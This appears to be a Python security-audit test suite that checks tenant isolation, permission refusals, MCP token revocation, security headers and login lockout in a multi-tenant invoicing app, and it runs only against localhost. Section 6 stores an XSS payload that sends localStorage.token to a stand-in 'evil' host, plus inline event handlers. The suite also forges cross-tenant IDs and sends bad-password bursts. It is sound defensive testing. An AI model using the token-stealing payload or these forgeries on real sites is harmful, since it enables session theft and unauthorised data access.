"""
Security audit 2026-10-09 — tenant and assigned-company isolation suite.

Builds two tenants under the seed admin and attacks across the boundary with
real API calls, through REST and MCP. Every refused call is checked twice: it is
refused (403/404/400/401) AND nothing it targeted changed or leaked. Every
section also proves the legitimate path still works, because a suite that only
shows things are blocked would pass just as well if everything were blocked.

  seed (admin)
  ├── secAdminA  Administrator ── SecTest A1, SecTest A2 ── secUserA1 (A1 [+A2])
  └── secAdminB  Administrator ── SecTest B1

Sections:
  1  TaxClaim claim-summary: body companyId is authorised
  2  Challan create: a foreign sales order / order line is refused, B's order untouched
  3  Goods receipt update: a foreign supplier is refused, receipt unchanged
  4  Bill create: a foreign challan answers 404 and names nothing of B's
  5  Global tables (FBR lookup, merge fields): seed admin only
  6  Print template script is stripped on save; layout kept
  7  Tenant Access: unknown and foreign company ids look the same (403)
  8  Company removal cascades to the accounts beneath the admin
  9  Own password cannot be set through /api/users/{self}
 10  MCP token dies on admin reset and on own password change
 11  Common supplier edit never rewrites another tenant's group
 12  Security headers on every response
 13  Seed admin lockout is short and real (needs --db; unlocks afterwards)

Usage:
  python scripts/test_security_audit_2026_10_09.py --base http://localhost:5137 [--db "<conn>"]
Local disposable databases only. Rows are removed on success.
"""
from __future__ import annotations
import argparse, json, sys, time, urllib.request, urllib.error
from datetime import datetime, timezone
from typing import Any

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

ap = argparse.ArgumentParser()
ap.add_argument("--base", default="http://localhost:5134")
ap.add_argument("--admin-user", default="admin")
ap.add_argument("--admin-pass", default="admin123")
ap.add_argument("--db", default=None, help="ODBC connection string of the SAME local scratch database (section 13)")
args = ap.parse_args()
BASE = args.base.rstrip("/")
host = BASE.split("//", 1)[-1].split(":")[0]
if host not in ("localhost", "127.0.0.1"):
    sys.exit("Refusing to run against a non-local host.")


def request(method: str, path: str, token: str | None = None, body: Any = None, raw_headers: bool = False):
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            txt = r.read().decode()
            out = json.loads(txt) if txt and txt.lstrip()[:1] in "{[" else txt
            return (r.status, out, dict(r.headers)) if raw_headers else (r.status, out)
    except urllib.error.HTTPError as e:
        txt = e.read().decode() if e.fp else ""
        try:
            out = json.loads(txt) if txt else None
        except Exception:
            out = txt
        return (e.code, out, dict(e.headers)) if raw_headers else (e.code, out)


def login(u: str, p: str, expect_ok: bool = True) -> str | None:
    for _ in range(6):
        s, d = request("POST", "/api/auth/login", body={"username": u, "password": p})
        if s == 429:
            time.sleep(30)
            continue
        if expect_ok:
            assert s == 200, f"login {u}: {s} {d}"
            return d["token"]
        return d["token"] if s == 200 else None
    raise AssertionError(f"login {u}: still rate-limited")


results: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, detail: Any = "") -> None:
    results.append((name, ok, str(detail)))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + ("" if ok else f"  -- {str(detail)[:300]}"))


def section(t: str) -> None:
    print(f"\n=== {t} ===")


PW = "SecAudit#2026a"
PW2 = "SecAudit#2026b"
PW3 = "SecAudit#2026c"
USERS = ["secUserA1", "secAdminA", "secAdminB"]
COMPANIES = ["SecTest A1", "SecTest A2", "SecTest B1"]
today = datetime.now(timezone.utc).strftime("%Y-%m-%dT00:00:00Z")

section(f"setup against {BASE}")
seed = login(args.admin_user, args.admin_pass)
s, me = request("GET", "/api/auth/me", seed)
assert me and me.get("isSeedAdmin"), "--admin-user must be the seed admin"

# leftovers from an earlier failed run
_, comps = request("GET", "/api/companies", seed)
for c in comps or []:
    if c["name"] in COMPANIES:
        request("DELETE", f"/api/companies/{c['id']}", seed)
_, users = request("GET", "/api/users", seed)
for name in USERS:
    for u in users or []:
        if u["username"] == name:
            request("DELETE", f"/api/users/{u['id']}", seed)

_, roles = request("GET", "/api/roles", seed)
role_id = {r["name"]: r["id"] for r in roles}


def create_user(token: str, username: str, role_names: list[str]) -> dict:
    s, d = request("POST", "/api/users", token, {"username": username, "fullName": username, "password": PW, "role": "User"})
    assert s == 201, f"create {username}: {s} {d}"
    if role_names:
        s2, d2 = request("PUT", f"/api/users/{d['id']}/roles", token, {"roleIds": [role_id[n] for n in role_names]})
        assert s2 == 200, f"roles for {username}: {s2} {d2}"
    return d


def create_company(token: str, name: str) -> dict:
    s, d = request("POST", "/api/companies", token, {
        "name": name, "fullAddress": f"{name} HQ", "phone": "+92-21-0000000",
        "ntn": "1234567", "cnic": "1234567890123", "strn": "1234567890123",
        "fbrSellerRegistrationNo": "1234567", "startingChallanNumber": 1, "startingInvoiceNumber": 1,
        "startingPurchaseBillNumber": 1, "startingGoodsReceiptNumber": 1,
        "fbrEnvironment": "sandbox", "fbrProvinceCode": 8})
    assert s in (200, 201), f"company {name}: {s} {d}"
    return d


def create_client(token: str, company_id: int, name: str) -> dict:
    s, d = request("POST", "/api/clients", token, {"name": name, "address": "1 Test Road", "phone": "021-1",
        "companyId": company_id, "ntn": "7654321", "fbrProvinceCode": 8, "registrationType": "Registered"})
    assert s in (200, 201), f"client {name}: {s} {d}"
    return d


def create_supplier(token: str, company_id: int, name: str, ntn: str | None = None) -> dict:
    body = {"companyId": company_id, "name": name}
    if ntn:
        body["ntn"] = ntn
    s, d = request("POST", "/api/suppliers", token, body)
    assert s in (200, 201), f"supplier {name}: {s} {d}"
    return d


A = create_user(seed, "secAdminA", ["Administrator"])
B = create_user(seed, "secAdminB", ["Administrator"])
tA = login("secAdminA", PW)
tB = login("secAdminB", PW)
coA1 = create_company(tA, "SecTest A1")
coA2 = create_company(tA, "SecTest A2")
coB1 = create_company(tB, "SecTest B1")
mcp_roles = [n for n in ("Sales Edition", "MCP Access") if n in role_id]
uA1 = create_user(tA, "secUserA1", [])
s, d = request("PUT", f"/api/users/{uA1['id']}/roles", seed, {"roleIds": [role_id[n] for n in mcp_roles]})
assert s == 200, f"seed assigns MCP roles: {s} {d}"
# Lines with a per-user MCP catalog (customize) also need the user's policy granted.
s, prof = request("GET", f"/api/mcp/catalog/{uA1['id']}", seed)
if s == 200 and isinstance(prof, dict):
    tools = [t["name"] for t in prof.get("tools", []) if t.get("configurable")]
    body = {k: prof[k] for k in ("revision", "accessGranted", "writesGranted", "accessEnabled", "writesEnabled") if k in prof}
    body.update(accessGranted=True, accessEnabled=True, grantedTools=tools, selectedTools=tools)
    s, d = request("PUT", f"/api/mcp/catalog/{uA1['id']}", seed, body)
    assert s == 200, f"seed grants the MCP catalog policy: {s} {d}"
s, d = request("PUT", f"/api/usercompanies/user/{uA1['id']}", tA, {"companyIds": [coA1["id"], coA2["id"]]})
assert s == 200, f"A grants A1+A2 to userA1: {s} {d}"
clA1 = create_client(tA, coA1["id"], "SecTest Client A1")
clB1 = create_client(tB, coB1["id"], "SecTest Client B1")

# ── 1 ────────────────────────────────────────────────────────────────
section("1  TaxClaim claim-summary authorises the body's company")
claim = {"billDate": today, "billGstRate": 18, "billRows": [{"hsCode": "8481.8090", "itemTypeName": "x", "qty": 1, "value": 100}]}
s, d = request("POST", "/api/tax-claim/claim-summary", tA, {**claim, "companyId": coB1["id"]})
check("A reading B1's claim summary -> 403", s == 403, f"{s} {d}")
check("the refusal carries no purchase data", not isinstance(d, dict) or "rows" not in d and "purchases" not in json.dumps(d).lower(), d)
s, d = request("POST", "/api/tax-claim/claim-summary", tA, {**claim, "companyId": coA1["id"]})
check("A reading its own A1 claim summary -> 200", s == 200, f"{s} {d}")

# ── 2 ────────────────────────────────────────────────────────────────
section("2  Challan create refuses another company's sales order")
s, soB = request("POST", f"/api/salesorders/company/{coB1['id']}", tB, {"clientId": clB1["id"], "orderDate": today,
    "items": [{"description": "B1 priced line", "quantity": 4, "unit": "Pcs", "unitPrice": 777}]})
assert s in (200, 201), f"B sales order: {s} {soB}"
_, soB_before = request("GET", f"/api/salesorders/{soB['id']}", tB)
_, a1_before = request("GET", f"/api/deliverychallans/company/{coA1['id']}", tA)
forged = {"companyId": coA1["id"], "clientId": clA1["id"], "deliveryDate": today, "salesOrderId": soB["id"],
          "items": [{"description": "forged", "quantity": 1, "unit": "Pcs", "salesOrderItemId": soB["items"][0]["id"]}]}
s, d = request("POST", f"/api/deliverychallans/company/{coA1['id']}", tA, forged)
check("challan linked to B's sales order -> 400", s == 400, f"{s} {d}")
check("the refusal does not echo B's order number or price", "777" not in json.dumps(d) and str(soB.get("salesOrderNumber", "~")) not in json.dumps(d), d)
forged_line = {**forged, "salesOrderId": None}
s, d = request("POST", f"/api/deliverychallans/company/{coA1['id']}", tA, forged_line)
check("challan line linked to B's order line (no header link) -> 400", s == 400, f"{s} {d}")
_, a1_after = request("GET", f"/api/deliverychallans/company/{coA1['id']}", tA)
check("no challan was created in A1", len(a1_after or []) == len(a1_before or []), f"{len(a1_before or [])} -> {len(a1_after or [])}")
_, soB_after = request("GET", f"/api/salesorders/{soB['id']}", tB)
check("B's sales order is unchanged", json.dumps(soB_before, sort_keys=True) == json.dumps(soB_after, sort_keys=True))
s, soA = request("POST", f"/api/salesorders/company/{coA1['id']}", tA, {"clientId": clA1["id"], "orderDate": today,
    "items": [{"description": "A1 line", "quantity": 2, "unit": "Pcs", "unitPrice": 50}]})
s, dcA = request("POST", f"/api/deliverychallans/company/{coA1['id']}", tA, {"companyId": coA1["id"], "clientId": clA1["id"],
    "deliveryDate": today, "salesOrderId": soA["id"],
    "items": [{"description": "A1 line", "quantity": 1, "unit": "Pcs", "salesOrderItemId": soA["items"][0]["id"]}]})
check("challan linked to A's own sales order -> 200/201", s in (200, 201), f"{s} {dcA}")

# ── 3 ────────────────────────────────────────────────────────────────
section("3  Goods receipt update refuses another company's supplier")
supA = create_supplier(tA, coA1["id"], "SecTest Supplier A1")
supB = create_supplier(tB, coB1["id"], "SecTest Supplier B1")
s, gr = request("POST", "/api/goodsreceipts", tA, {"companyId": coA1["id"], "supplierId": supA["id"], "receiptDate": today,
    "items": [{"description": "Received", "quantity": 2, "unit": "Pcs"}]})
assert s in (200, 201), f"goods receipt: {s} {gr}"
upd = {"receiptDate": today, "supplierId": supB["id"], "notes": "forged",
       "items": [{"id": i["id"], "description": i["description"], "quantity": i["quantity"], "unit": i.get("unit", "Pcs")} for i in gr["items"]]}
s, d = request("PUT", f"/api/goodsreceipts/{gr['id']}", tA, upd)
check("receipt re-pointed at B's supplier -> 404", s == 404, f"{s} {d}")
_, gr_after = request("GET", f"/api/goodsreceipts/{gr['id']}", tA)
check("receipt still names A's supplier, notes untouched", gr_after.get("supplierId") == supA["id"] and gr_after.get("notes") != "forged", gr_after)
check("B's supplier name never reached A", "SecTest Supplier B1" not in json.dumps(gr_after))
s, d = request("PUT", f"/api/goodsreceipts/{gr['id']}", tA, {**upd, "supplierId": supA["id"], "notes": "legit edit"})
check("ordinary receipt edit still works", s == 200, f"{s} {d}")

# ── 4 ────────────────────────────────────────────────────────────────
section("4  Bill create treats another company's challan as missing")
s, dcB = request("POST", f"/api/deliverychallans/company/{coB1['id']}", tB, {"companyId": coB1["id"], "clientId": clB1["id"],
    "deliveryDate": today, "poNumber": "SECRET-PO-B1", "items": [{"description": "B1 goods", "quantity": 1, "unit": "Pcs"}]})
assert s in (200, 201), f"B challan: {s} {dcB}"
s, d = request("POST", "/api/invoices", tA, {"companyId": coA1["id"], "clientId": clA1["id"], "date": today,
    "gstRate": 18, "challanIds": [dcB["id"]],
    "items": [{"deliveryItemId": dcB["items"][0]["id"], "description": "B1 goods", "quantity": 1, "unit": "Pcs", "unitPrice": 10}]})
check("bill on B's challan -> 404", s == 404, f"{s} {d}")
msg = json.dumps(d)
check("message names neither B's challan status nor 'does not belong'", "status" not in msg.lower().replace("statuscode", "")
      and "belong" not in msg.lower() and "SECRET-PO-B1" not in msg, d)

# ── 5 ────────────────────────────────────────────────────────────────
section("5  Installation-wide tables are written by the seed admin only")
_, lookups = request("GET", "/api/fbrlookup", tA)
if lookups:
    row = lookups[0]
    s, d = request("PUT", f"/api/fbrlookup/{row['id']}", tA, {**row, "label": "hijacked by tenant A"})
    check("tenant admin edits a shared FBR lookup -> 403", s == 403, f"{s} {d}")
    _, again = request("GET", "/api/fbrlookup", seed)
    check("the shared FBR lookup is unchanged", next(x for x in again if x["id"] == row["id"])["label"] == row["label"])
    s, d = request("PUT", f"/api/fbrlookup/{row['id']}", seed, row)
    check("seed admin can still edit it", s == 200, f"{s} {d}")
else:
    check("FBR lookup rows exist to test against", False, "no rows")
s, d = request("POST", "/api/mergefields", tA, {"templateType": "Bill", "fieldExpression": "{{x}}", "label": "x", "category": "x", "sortOrder": 1})
check("tenant admin creates a shared merge field -> 403", s == 403, f"{s} {d}")
s, fields = request("GET", "/api/mergefields", tA)
check("tenant admin can still READ merge fields", s == 200 and isinstance(fields, list), s)

# ── 6 ────────────────────────────────────────────────────────────────
section("6  Print template script is stripped on save")
evil = ('<html><head><style>.t{color:red}</style></head><body><div class="t">{{companyName}} LAYOUT-KEPT</div>'
        '<script>fetch("//evil/?"+localStorage.token)</script><img src="x.png" onerror="alert(1)">'
        '<a href="javascript:alert(2)">x</a><img/onload=alert(3) src="y.png"></body></html>')
s, d = request("PUT", f"/api/printtemplates/company/{coA1['id']}/Bill", tA, {"htmlContent": evil, "editorMode": "code"})
check("template save -> 200", s == 200, f"{s} {d}")
s, tpl = request("GET", f"/api/printtemplates/company/{coA1['id']}/Bill", tA)
html = (tpl or {}).get("htmlContent", "") if isinstance(tpl, dict) else ""
low = html.lower()
check("stored template has no <script>", "<script" not in low, html[:200])
check("stored template has no on…= handler", "onerror" not in low and "onload" not in low, html[:300])
check("stored template has no javascript: URL", "javascript:" not in low, html[:300])
check("layout, styles and merge fields are kept", "LAYOUT-KEPT" in html and "{{companyName}}" in html and ".t{color:red}" in html, html[:300])

# ── 7 ────────────────────────────────────────────────────────────────
section("7  Tenant Access gives one answer for foreign and unknown companies")
s1, d1 = request("PUT", f"/api/usercompanies/user/{uA1['id']}", tA, {"companyIds": [coA1["id"], coB1["id"]]})
s2, d2 = request("PUT", f"/api/usercompanies/user/{uA1['id']}", tA, {"companyIds": [coA1["id"], 987654321]})
check("granting B's company -> 403", s1 == 403, f"{s1} {d1}")
check("granting a company that does not exist -> 403 too", s2 == 403, f"{s2} {d2}")
check("neither reply says 'unknown'", "unknown" not in json.dumps([d1, d2]).lower(), [d1, d2])

# ── 8 ────────────────────────────────────────────────────────────────
section("8  Taking a company from an admin takes it from the accounts beneath")
tU = login("secUserA1", PW)
_, cos = request("GET", "/api/companies", tU)
check("userA1 starts with A1 and A2", {coA1["id"], coA2["id"]} <= {c["id"] for c in cos or []}, cos)
s, d = request("PUT", f"/api/usercompanies/user/{A['id']}", seed, {"companyIds": [coA1["id"]]})
check("seed removes A2 from Admin A -> 200", s == 200, f"{s} {d}")
_, cos = request("GET", "/api/companies", tU)
got = {c["id"] for c in cos or []}
check("userA1 lost A2 on its very next request", coA2["id"] not in got, got)
check("userA1 kept A1", coA1["id"] in got, got)
s, _ = request("GET", f"/api/deliverychallans/company/{coA2['id']}", tU)
check("userA1 is refused A2's data -> 403", s == 403, s)

# ── 9 ────────────────────────────────────────────────────────────────
section("9  Your own password changes through My Profile only")
s, d = request("PUT", f"/api/users/{A['id']}", tA, {"fullName": "secAdminA", "password": "Hijacked#2026"})
check("PUT /api/users/{self} with a password -> 400", s == 400, f"{s} {d}")
check("old password still signs in", login("secAdminA", PW, expect_ok=False) is not None)
check("the new password does not", login("secAdminA", "Hijacked#2026", expect_ok=False) is None)
s, d = request("PUT", f"/api/users/{A['id']}", tA, {"fullName": "Sec Admin A"})
check("editing your own name still works", s == 200, f"{s} {d}")

# ── 10 ───────────────────────────────────────────────────────────────
section("10 MCP tokens end when the account's credentials change")


def mcp_ping(secret: str) -> int:
    s, _ = request("POST", "/mcp", secret, {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}})
    return s


def mint(name: str) -> str | None:
    s, d = request("POST", "/api/mcp-admin/tokens", seed, {"userId": uA1["id"], "name": name, "companyIds": [coA1["id"]], "scopes": ["read"], "expiresInDays": 5})
    return d.get("secret") if s == 200 and isinstance(d, dict) else None


if "MCP Access" not in role_id:
    check("MCP Access role exists", False, "role missing")
else:
    t1 = mint("sec-audit reset")
    check("seed mints a token for userA1", t1 is not None)
    check("token works", t1 is not None and mcp_ping(t1) == 200)
    s, d = request("PUT", f"/api/users/{uA1['id']}", tA, {"fullName": "secUserA1", "password": PW2})
    check("Admin A resets userA1's password -> 200", s == 200, f"{s} {d}")
    check("the token is refused straight after the reset", t1 is not None and mcp_ping(t1) == 401)
    t2 = mint("sec-audit own change")
    tU = login("secUserA1", PW2)
    check("a fresh token works", t2 is not None and mcp_ping(t2) == 200)
    s, d = request("PUT", "/api/auth/password", tU, {"currentPassword": PW2, "newPassword": PW3})
    check("userA1 changes own password -> 200", s == 200, f"{s} {d}")
    check("the token is refused straight after the change", t2 is not None and mcp_ping(t2) == 401)
    t3 = mint("sec-audit unaffected")
    check("a token minted after the change works", t3 is not None and mcp_ping(t3) == 200)
    s, lst = request("GET", "/api/mcp-admin/tokens", seed)
    mine = [t for t in lst or [] if t.get("name", "").startswith("sec-audit")]
    check("the two old tokens show as Revoked", sum(1 for t in mine if t.get("status") == "Revoked") >= 2, [(t["name"], t["status"]) for t in mine])

# ── 11 ───────────────────────────────────────────────────────────────
section("11 Editing a common supplier never rewrites another tenant's group")
# Unique per run: a common-supplier group outlives its deleted suppliers, so a
# fixed NTN would collide with an earlier run's leftover group.
run_ntn = str(int(time.time()))[-7:]
new_ntn = str((int(run_ntn) + 1) % 10_000_000).zfill(7)
sA = create_supplier(tA, coA1["id"], "SecTest Shared Supplier", run_ntn)
sB = create_supplier(tB, coB1["id"], "SecTest Shared Supplier", run_ntn)
gid = sA.get("supplierGroupId")
if gid and gid == sB.get("supplierGroupId"):
    _, detail = request("GET", f"/api/suppliers/common/{gid}", tA)
    body = {"name": "SecTest Renamed By A " + run_ntn, "ntn": new_ntn, "address": detail.get("address"), "phone": detail.get("phone"),
            "email": detail.get("email"), "strn": detail.get("strn"), "cnic": detail.get("cnic"), "site": detail.get("site"),
            "registrationType": detail.get("registrationType"), "fbrProvinceCode": detail.get("fbrProvinceCode")}
    s, d = request("PUT", f"/api/suppliers/common/{gid}", tA, body)
    check("A edits the shared supplier -> 200", s == 200, f"{s} {d}")
    _, sB_after = request("GET", f"/api/suppliers/{sB['id']}", tB)
    check("B's supplier keeps its name", sB_after.get("name") == "SecTest Shared Supplier", sB_after)
    check("B's supplier keeps its NTN", sB_after.get("ntn") == run_ntn, sB_after)
    _, grpB = request("GET", f"/api/suppliers/common/{sB_after.get('supplierGroupId')}", tB)
    check("B's common supplier still reads B's name", (grpB or {}).get("displayName") == "SecTest Shared Supplier", grpB)
    _, sA_after = request("GET", f"/api/suppliers/{sA['id']}", tA)
    check("A's supplier took the new name", sA_after.get("name") == "SecTest Renamed By A " + run_ntn, sA_after)
else:
    print(f"  [SKIP] suppliers were not grouped on create ({gid} / {sB.get('supplierGroupId')})")

# ── 12 ───────────────────────────────────────────────────────────────
section("12 Security headers")
s, _, h = request("GET", "/api/auth/me", tA, raw_headers=True)
hl = {k.lower(): v for k, v in h.items()}
check("X-Content-Type-Options nosniff", hl.get("x-content-type-options") == "nosniff", hl)
check("X-Frame-Options DENY", hl.get("x-frame-options") == "DENY", hl)
check("CSP forbids framing", "frame-ancestors 'none'" in hl.get("content-security-policy", ""), hl)

# ── 14 ───────────────────────────────────────────────────────────────
section("14 Company data reached by id or query parameter")
s, d = request("GET", f"/api/dashboard/kpis?companyId={coB1['id']}", tA)
check("A reads B1's dashboard KPIs -> 403", s == 403, f"{s} {str(d)[:120]}")
s, d = request("GET", f"/api/dashboard/kpis?companyId={coA1['id']}", tA)
check("A reads its own A1 dashboard -> 200", s == 200, s)
s, d = request("GET", f"/api/POImport/archives?companyId={coB1['id']}", tA)
check("A lists B1's archived customer POs -> 403", s == 403, s)
s, d = request("GET", "/api/POImport/archives", tA)
mine = {coA1["id"], coA2["id"]}
check("A's unfiltered PO archive list holds only A's companies",
      s == 200 and all(r.get("companyId") in mine for r in (d or {}).get("rows", [])), f"{s} {str(d)[:160]}")
s, d = request("GET", "/api/import-feedback/incorrect", tA)
items = (d or {}).get("items", []) if isinstance(d, dict) else []
check("A's import-feedback list holds only A's companies", s == 200 and all(r.get("companyId") in mine for r in items), f"{s} {str(d)[:160]}")
s, d = request("GET", f"/api/itemtypes/uoms-for-hs?companyId={coB1['id']}&hsCode=8481.8090", tA)
check("A runs an FBR unit lookup on B1's token -> refused", s in (403, 404), s)
_, before = request("GET", "/api/poformats", seed)
s, d = request("POST", "/api/poformats/simple", tA, {"name": "SecTest global", "companyId": None, "clientId": None, "rawText": "PO No Date Description Qty",
    "poNumberLabel": "PO No", "poDateLabel": "Date", "descriptionHeader": "Description", "quantityHeader": "Qty"})
check("A creates a format shared by every tenant -> refused", s in (400, 403), f"{s} {d}")
_, after = request("GET", "/api/poformats", seed)
check("no shared format was created", len(after or []) == len(before or []), f"{len(before or [])} -> {len(after or [])}")

# ── 13 ───────────────────────────────────────────────────────────────
section("13 Seed admin lockout is short, and real")
if not args.db:
    print("  [SKIP] needs --db (the section unlocks the seed admin afterwards)")
else:
    import pyodbc
    time.sleep(65)  # a fresh login-limiter window
    for _ in range(10):
        request("POST", "/api/auth/login", body={"username": args.admin_user, "password": "wrong-password"})
    with pyodbc.connect(args.db) as cn:
        until = cn.cursor().execute("SELECT LockoutUntil FROM Users WHERE Username = ?", args.admin_user).fetchone()[0]
    check("ten bad guesses lock the seed admin", until is not None, until)
    if until is not None:
        minutes = (until - datetime.utcnow()).total_seconds() / 60
        check("…for about 15 minutes, not 2 hours", 10 <= minutes <= 16, f"{minutes:.1f} min")
    time.sleep(65)
    s, _ = request("POST", "/api/auth/login", body={"username": args.admin_user, "password": args.admin_pass})
    check("the right password is refused while locked", s == 401, s)
    with pyodbc.connect(args.db, autocommit=True) as cn:
        cn.cursor().execute("UPDATE Users SET LockoutUntil = NULL, FailedLoginAttempts = 0 WHERE Username = ?", args.admin_user)
    seed = login(args.admin_user, args.admin_pass)

# ── summary + cleanup ────────────────────────────────────────────────
failed = [r for r in results if not r[1]]
print(f"\n=== {len(results) - len(failed)}/{len(results)} checks passed ===")
if failed:
    print("Rows left in place for inspection.")
    sys.exit(1)
for c in (coA1, coA2, coB1):
    request("DELETE", f"/api/companies/{c['id']}", seed)
for u in (uA1, A, B):
    request("DELETE", f"/api/users/{u['id']}", seed)
print("cleaned up")
